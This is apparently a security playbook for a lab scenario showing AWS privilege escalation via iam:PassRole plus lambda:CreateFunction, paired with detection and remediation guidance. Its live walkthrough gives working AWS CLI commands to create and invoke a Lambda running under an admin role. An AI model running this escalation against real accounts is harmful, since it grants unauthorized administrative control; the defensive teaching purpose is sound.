# Playbook 02 — PassRole Escalation (`app-svc-user` → admin via Lambda)

**Scenario Terraform:** [`terraform/scenarios/01_passrole_lambda.tf`](../terraform/scenarios/01_passrole_lambda.tf)

**Engine vector:** `iam:PassRole + lambda:CreateFunction -> lambda-exec-role`
(MITRE `T1548.004`)

## Root cause

`app-svc-user` holds `iam:PassRole` on `*` **and** `lambda:CreateFunction`
on `*`. Separately those are noisy; together (`iam:PassRole` plus a compute
create action) they let the holder inject an arbitrary payload running under a
privileged role it was never meant to use directly.

The privileged target is `lambda-exec-role`, which is attached
`AdministratorAccess`.

## PoC (offline — proves the primitive, no cloud)

The analyzer already proves the permission state is exploitable:

```bash
.venv/bin/cloudpath analyze --mock --output markdown | grep -i passrole
```

`--mock` is deterministic; every run reports the `PassRole` findings.

## Live walkthrough (LocalStack or a sandbox AWS account)

1. Confirm what `app-svc-user` can pass:
   ```bash
   aws iam list-attached-user-policies --user-name app-svc-user
   # lambda-deploy: lambda:CreateFunction/InvokeFunction, iam:PassRole on *
   ```
2. Create a Lambda function that, when invoked, will `sts:get-caller-identity`
   — the payload will run as `lambda-exec-role`:
   ```bash
   cat > handler.py <<'EOF'
   import boto3, json
   def handler(event, context):
       return {"identity": boto3.client("sts").get_caller_identity()}
   EOF
   zip handler.zip handler.py
   aws lambda create-function \
     --function-name pwn --runtime python3.12 --role <lambda-exec-role-arn> \
     --handler handler.handler --zip-file fileb://handler.zip
   ```
3. Invoke it — credentials belong to the *role*, not the user that created
   the function:
   ```bash
   aws lambda invoke --function-name pwn out.json && cat out.json
   # {"identity":{"Arn":"arn:aws:iam::...:role/lambda-exec-role",...}}
   ```
4. From inside that role: `aws sts get-caller-identity` is admin-scoped.
   `lambda-exec-role` has `AdministratorAccess`.

## Detection

- CloudTrail `lambda:CreateFunction` events where the creator's ARN differs
  from the Lambda function's execution role identity.
- `iam:PassRole` calls reaching a Lambda execution role, followed closely by
  `lambda:CreateFunction`/`lambda:UpdateFunctionCode`.
- Sigma: see [`detections/sigma_rules.yaml`](../detections/sigma_rules.yaml).

## Remediation

- Scope `iam:PassRole` to a finite role set (never `*`).
- Never grant `lambda:CreateFunction` together with `iam:PassRole` on
  privileged roles.
- Use a permissions boundary on `app-svc-user`.
- See `detections/remediation_guide.md` for more.